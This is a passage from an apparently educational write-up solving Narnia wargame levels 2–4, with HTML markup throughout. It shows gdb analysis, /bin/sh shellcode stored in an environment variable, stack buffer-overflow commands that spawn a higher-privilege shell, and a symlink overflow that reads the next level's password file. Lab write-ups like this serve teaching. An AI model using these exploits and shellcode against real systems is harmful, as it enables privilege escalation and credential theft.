 &lt;span class="n"&gt;eip&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x8048485&lt;/span&gt; &lt;span class="n"&gt;in&lt;/span&gt; &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;saved&lt;/span&gt; &lt;span class="n"&gt;eip&lt;/span&gt; &lt;span class="mh"&gt;0xf7e404b3&lt;/span&gt;
 &lt;span class="n"&gt;Arglist&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="mh"&gt;0xffffd698&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
 &lt;span class="n"&gt;Locals&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="mh"&gt;0xffffd698&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Previous&lt;/span&gt; &lt;span class="n"&gt;frame&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="n"&gt;sp&lt;/span&gt; &lt;span class="n"&gt;is&lt;/span&gt; &lt;span class="mh"&gt;0xffffd6a0&lt;/span&gt;
 &lt;span class="n"&gt;Saved&lt;/span&gt; &lt;span class="n"&gt;registers&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
  &lt;span class="n"&gt;ebp&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="mh"&gt;0xffffd698&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;eip&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="mh"&gt;0xffffd69c&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;To find the size of the frame we subtract these values:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="mh"&gt;0xffffd69c&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mh"&gt;0xffffd610&lt;/span&gt;
&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;140&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So we know that 140 bytes are needed to reach the return address, where we will add our pointer.&lt;/p&gt;
&lt;h3&gt;Step 3: Finding the EGG ShellCode Address&lt;/h3&gt;
&lt;p&gt;Where do we want to point the return address to? Well, we already know  a way to spawn a shell: using an environment variable:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;narnia2@melinda:/tmp&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;export &lt;/span&gt;&lt;span class="nv"&gt;EGG&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;python -c&lt;span class="s1"&gt;&amp;#39;print &amp;quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80&amp;quot;&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;To find the address of &lt;strong&gt;EGG&lt;/strong&gt; we use the following &lt;strong&gt;C&lt;/strong&gt; code:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;narnia2&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;melinda&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;cat&lt;/span&gt; &lt;span class="n"&gt;getbashadd&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;
&lt;span class="cp"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[]){&lt;/span&gt;
        &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;ptr&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="n"&gt;ptr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getenv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
        &lt;span class="n"&gt;ptr&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%s is at %p&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="n"&gt;ptr&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Running it gives:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;narnia2&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;melinda&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;getshadd&lt;/span&gt; &lt;span class="n"&gt;EGG&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;narnia&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;narnia2&lt;/span&gt;
&lt;span class="n"&gt;EGG&lt;/span&gt; &lt;span class="n"&gt;will&lt;/span&gt; &lt;span class="n"&gt;be&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="mh"&gt;0xffffd945&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Step 4: Running the Exploit!&lt;/h3&gt;
&lt;p&gt;Now all we need to do is to run the binary with 140 bytes of junk plus the address that we want to point  the return address to:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;narnia2@melinda:/tmp/ya2&lt;span class="nv"&gt;$ &lt;/span&gt;/narnia/narnia2 &lt;span class="sb"&gt;`&lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;A&amp;quot;*140 + &amp;quot;\x45\xd9\xff\xff&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;
&lt;span class="nv"&gt;$ &lt;/span&gt;whoami
narnia3
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Level 3: Stack Overflow, Files, and Symbolic Links&lt;/h2&gt;
&lt;h3&gt;Step 1: Understanding the Problem&lt;/h3&gt;
&lt;p&gt;The fourth level starts with:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;narnia3@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;./narnia3
usage, ./narnia3 file, will send contents of file 2 /dev/null
narnia3@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;cat narnia3.c
&lt;span class="c"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span class="c"&gt;#include &amp;lt;sys/types.h&amp;gt;&lt;/span&gt;
&lt;span class="c"&gt;#include &amp;lt;sys/stat.h&amp;gt;&lt;/span&gt;
&lt;span class="c"&gt;#include &amp;lt;fcntl.h&amp;gt;&lt;/span&gt;
&lt;span class="c"&gt;#include &amp;lt;unistd.h&amp;gt;&lt;/span&gt;
&lt;span class="c"&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span class="c"&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;

int main&lt;span class="o"&gt;(&lt;/span&gt;int argc, char **argv&lt;span class="o"&gt;){&lt;/span&gt;

        int  ifd,  ofd;
        char ofile&lt;span class="o"&gt;[&lt;/span&gt;16&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/dev/null&amp;quot;&lt;/span&gt;;
        char ifile&lt;span class="o"&gt;[&lt;/span&gt;32&lt;span class="o"&gt;]&lt;/span&gt;;
        char buf&lt;span class="o"&gt;[&lt;/span&gt;32&lt;span class="o"&gt;]&lt;/span&gt;;

        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;argc !&lt;span class="o"&gt;=&lt;/span&gt; 2&lt;span class="o"&gt;){&lt;/span&gt;
                &lt;span class="nb"&gt;printf&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;usage, %s file, will send contents of file 2 /dev/null\n&amp;quot;&lt;/span&gt;,argv&lt;span class="o"&gt;[&lt;/span&gt;0&lt;span class="o"&gt;])&lt;/span&gt;;
                &lt;span class="nb"&gt;exit&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;-1&lt;span class="o"&gt;)&lt;/span&gt;;
        &lt;span class="o"&gt;}&lt;/span&gt;

        /* open files */
        strcpy&lt;span class="o"&gt;(&lt;/span&gt;ifile, argv&lt;span class="o"&gt;[&lt;/span&gt;1&lt;span class="o"&gt;])&lt;/span&gt;;
        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;((&lt;/span&gt;&lt;span class="nv"&gt;ofd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; open&lt;span class="o"&gt;(&lt;/span&gt;ofile,O_RDWR&lt;span class="o"&gt;))&lt;/span&gt; &amp;lt; 0 &lt;span class="o"&gt;){&lt;/span&gt;
                &lt;span class="nb"&gt;printf&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;error opening %s\n&amp;quot;&lt;/span&gt;, ofile&lt;span class="o"&gt;)&lt;/span&gt;;
                &lt;span class="nb"&gt;exit&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;-1&lt;span class="o"&gt;)&lt;/span&gt;;
        &lt;span class="o"&gt;}&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;((&lt;/span&gt;&lt;span class="nv"&gt;ifd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; open&lt;span class="o"&gt;(&lt;/span&gt;ifile, O_RDONLY&lt;span class="o"&gt;))&lt;/span&gt; &amp;lt; 0 &lt;span class="o"&gt;){&lt;/span&gt;
                &lt;span class="nb"&gt;printf&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;error opening %s\n&amp;quot;&lt;/span&gt;, ifile&lt;span class="o"&gt;)&lt;/span&gt;;
                &lt;span class="nb"&gt;exit&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;-1&lt;span class="o"&gt;)&lt;/span&gt;;
        &lt;span class="o"&gt;}&lt;/span&gt;

        /* copy from file1 to file2 */
        &lt;span class="nb"&gt;read&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;ifd, buf, sizeof&lt;span class="o"&gt;(&lt;/span&gt;buf&lt;span class="o"&gt;)&lt;/span&gt;-1&lt;span class="o"&gt;)&lt;/span&gt;;
        write&lt;span class="o"&gt;(&lt;/span&gt;ofd,buf, sizeof&lt;span class="o"&gt;(&lt;/span&gt;buf&lt;span class="o"&gt;)&lt;/span&gt;-1&lt;span class="o"&gt;)&lt;/span&gt;;
        &lt;span class="nb"&gt;printf&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;copied contents of %s to a safer place... (%s)\n&amp;quot;&lt;/span&gt;,ifile,ofile&lt;span class="o"&gt;)&lt;/span&gt;;

        /* close &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;em */
        close&lt;span class="o"&gt;(&lt;/span&gt;ifd&lt;span class="o"&gt;)&lt;/span&gt;;
        close&lt;span class="o"&gt;(&lt;/span&gt;ofd&lt;span class="o"&gt;)&lt;/span&gt;;

        &lt;span class="nb"&gt;exit&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;1&lt;span class="o"&gt;)&lt;/span&gt;;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This program receives a file name as input, and then copies the content of this file to a second file pointing to &lt;code&gt;/dev/null&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;What is particularly interesting to us is the order that the variables are declared:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;ofile&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/dev/null&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;ifile&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Step 2: Understanding what is going on in the Memory&lt;/h3&gt;
&lt;p&gt;Let's debug this binary to see how we can exploit it. First with a simple 3-bytes input:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;set&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;`python -c &amp;#39;print &amp;quot;&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;*3&amp;#39;`&amp;quot;&lt;/span&gt;
&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;
&lt;span class="n"&gt;Starting&lt;/span&gt; &lt;span class="n"&gt;program&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;games&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;narnia&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;narnia3&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;`python -c &amp;#39;print &amp;quot;&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;*3&amp;#39;`&amp;quot;&lt;/span&gt;
&lt;span class="n"&gt;error&lt;/span&gt; &lt;span class="n"&gt;opening&lt;/span&gt; &lt;span class="n"&gt;aaa&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;OK, it makes sense, there is no such file. Now let's try the size of &lt;em&gt;ifile&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;set&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;`python -c &amp;#39;print &amp;quot;&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;*32&amp;#39;`&amp;quot;&lt;/span&gt;
&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;
&lt;span class="n"&gt;Starting&lt;/span&gt; &lt;span class="n"&gt;program&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;games&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;narnia&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;narnia3&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;`python -c &amp;#39;print &amp;quot;&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;*32&amp;#39;`&amp;quot;&lt;/span&gt;
&lt;span class="n"&gt;error&lt;/span&gt; &lt;span class="n"&gt;opening&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Mmm, interesting. It does not input any name. Let's try one byte less:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;set&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;`python -c &amp;#39;print &amp;quot;&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;*31&amp;#39;`&amp;quot;&lt;/span&gt;
&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;
&lt;span class="n"&gt;Starting&lt;/span&gt; &lt;span class="n"&gt;program&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;games&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;narnia&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;narnia3&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;`python -c &amp;#39;print &amp;quot;&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;*31&amp;#39;`&amp;quot;&lt;/span&gt;
&lt;span class="n"&gt;error&lt;/span&gt; &lt;span class="n"&gt;opening&lt;/span&gt; &lt;span class="n"&gt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The previous example showed the first byte after overflowing &lt;em&gt;ifile&lt;/em&gt;. This last example ends in the last possible byte in the array. Once we overflow &lt;em&gt;ifile&lt;/em&gt;, it skips  the checking, going straight to check whether &lt;em&gt;ofile&lt;/em&gt; is a valid name. Awesome!&lt;/p&gt;
&lt;h3&gt;Step 3: Writing and Applying the Exploit&lt;/h3&gt;
&lt;p&gt;We want two things happening in &lt;em&gt;ifile&lt;/em&gt;: first, to read the password file, then to overflows &lt;em&gt;ofile&lt;/em&gt;, making it to point to a file we have access to read.&lt;/p&gt;
&lt;p&gt;The best way to put all of this in one input name is creating a symbolic link with the following rules:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Point to &lt;em&gt;/etc/narnia_pass/narnia4&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;Fill the 32 bytes of the &lt;em&gt;ifile&lt;/em&gt; array with junk.&lt;/li&gt;
&lt;li&gt;End with a some file name which we  had created before, and we have permission to read (we can just use &lt;code&gt;touch&lt;/code&gt; to create an empty file).&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The result, for a file name &lt;em&gt;out&lt;/em&gt;, is:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;ln -s /etc/narnia_pass/narnia4 &lt;span class="k"&gt;$(&lt;/span&gt;python -c &lt;span class="s2"&gt;&amp;quot;print &amp;#39;A&amp;#39;*32 + &amp;#39;out&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now we can just run it and retrieve our password:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;narnia3@melinda:/tmp&lt;span class="nv"&gt;$ &lt;/span&gt;/narnia/narnia3 &lt;span class="sb"&gt;`&lt;/span&gt;python -c &lt;span class="s2"&gt;&amp;quot;print &amp;#39;A&amp;#39;*32 + &amp;#39;out&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;copied contents of AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAout to a safer place... &lt;span class="o"&gt;(&lt;/span&gt;out&lt;span class="o"&gt;)&lt;/span&gt;
narnia3@melinda:/tmp&lt;span class="nv"&gt;$ &lt;/span&gt;cat out
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Level 4: Classic Buffer Overflow with NOP&lt;/h2&gt;
&lt;h3&gt;Step 1: Understanding the Problem&lt;/h3&gt;
&lt;p&gt;This  fifth level starts with:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;narnia4@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;./narnia4
narnia4@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;cat narnia4.c

&lt;span class="c"&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
&lt;span class="c"&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span class="c"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span class="c"&gt;#include &amp;lt;ctype.h&amp;gt;&lt;/span&gt;

extern char **environ;

int main&lt;span class="o"&gt;(&lt;/span&gt;int argc,char **argv&lt;span class="o"&gt;){&lt;/span&gt;
  int i;
  char buffer&lt;span class="o"&gt;[&lt;/span&gt;256&lt;span class="o"&gt;]&lt;/span&gt;;

  &lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 0; environ&lt;span class="o"&gt;[&lt;/span&gt;i&lt;span class="o"&gt;]&lt;/span&gt; !&lt;span class="o"&gt;=&lt;/span&gt; NULL; i++&lt;span class="o"&gt;)&lt;/span&gt;
    memset&lt;span class="o"&gt;(&lt;/span&gt;environ&lt;span class="o"&gt;[&lt;/span&gt;i&lt;span class="o"&gt;]&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;\0&amp;#39;&lt;/span&gt;, strlen&lt;span class="o"&gt;(&lt;/span&gt;environ&lt;span class="o"&gt;[&lt;/span&gt;i&lt;span class="o"&gt;]))&lt;/span&gt;;

  &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;argc&amp;gt;1&lt;span class="o"&gt;)&lt;/span&gt;
    strcpy&lt;span class="o"&gt;(&lt;/span&gt;buffer,argv&lt;span class="o"&gt;[&lt;/span&gt;1&lt;span class="o"&gt;])&lt;/span&gt;;

  &lt;span class="k"&gt;return &lt;/span&gt;0;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This binary does three things: first, it creates a buffer array of size 256, then it makes all of the system environment variables equal to zero, and then it copies whatever user input it had to the buffer.&lt;/p&gt;
&lt;p&gt;The reason why this code clears  the environment variables is to avoid the possibility of us placing a shellcode exploit to them  (like we did in the Level 2).&lt;/p&gt;
&lt;h3&gt;Step 2: Outlining the Attack&lt;/h3&gt;
&lt;p&gt;To exploit this binary we are going to overwrite our &lt;strong&gt;return address&lt;/strong&gt; like in  level 2, but this time we can't use an external address to point to. However, since our Stack is executable, we can place the shellcode in the Stack. The steps we follow are:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Find out the size of the Stack.  Just having the return address won't help  since we can't point it to anywhere outside the code.&lt;/li&gt;
&lt;li&gt;Create a shellcode with the return address minus some value we define so that the return address points to somewhere inside the Stack.&lt;/li&gt;
&lt;li&gt;Fill the beginning of the Stack with a lots of &lt;a href="http://en.wikipedia.org/wiki/NOP"&gt;NOPs&lt;/a&gt; (No Operations), which in the x86 CPU family is represented with &lt;code&gt;0x90&lt;/code&gt;. If the pointer hits these places, it just keeps advancing until it finds our shell.&lt;/li&gt;
&lt;li&gt;To make everything fit right in the Stack frame, we pad the end of the shell code with junk.
.&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;Step 3: Getting the Frame Size&lt;/h3&gt;
&lt;p&gt;With gdb we can extract the relevant memory locations. Let's run our program with an input of the size of the buffer. Here we use the flag &lt;code&gt;--args&lt;/code&gt; because otherwise we will get an error that the name is too long:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;narnia4@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;gdb --args  narnia4 &lt;span class="sb"&gt;`&lt;/span&gt;python -c &lt;span class="s2"&gt;&amp;quot;print &amp;#39;A&amp;#39;*256&amp;quot;&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;
Reading symbols from /games/narnia/narnia4...&lt;span class="o"&gt;(&lt;/span&gt;no debugging symbols found&lt;span class="o"&gt;)&lt;/span&gt;...done.
&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nb"&gt;set &lt;/span&gt;disassembly-flavor intel
&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; disas main
Dump of assembler code &lt;span class="k"&gt;for function &lt;/span&gt;main:
   0x08048444 &amp;lt;+0&amp;gt;: push   ebp
   0x08048445 &amp;lt;+1&amp;gt;: mov    ebp,esp
   0x08048447 &amp;lt;+3&amp;gt;: push   edi
   0x08048448 &amp;lt;+4&amp;gt;: and    esp,0xfffffff0
   0x0804844b &amp;lt;+7&amp;gt;: sub    esp,0x130
&lt;span class="o"&gt;(&lt;/span&gt;..&lt;span class="o"&gt;)&lt;/span&gt;
   0x080484f0 &amp;lt;+172&amp;gt;: call   0x8048350 &amp;lt;strcpy@plt&amp;gt;
   0x080484f5 &amp;lt;+177&amp;gt;: mov    eax,0x0
   0x080484fa &amp;lt;+182&amp;gt;: mov    edi,DWORD PTR &lt;span class="o"&gt;[&lt;/span&gt;ebp-0x4&lt;span class="o"&gt;]&lt;/span&gt;
   0x080484fd &amp;lt;+185&amp;gt;: leave
   0x080484fe &amp;lt;+186&amp;gt;: ret
End of assembler dump.
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We put a breakpoint right before the Stack ends:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; b *main+182
Breakpoint 1 at 0x80484fa
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Running:&lt;/p&gt;
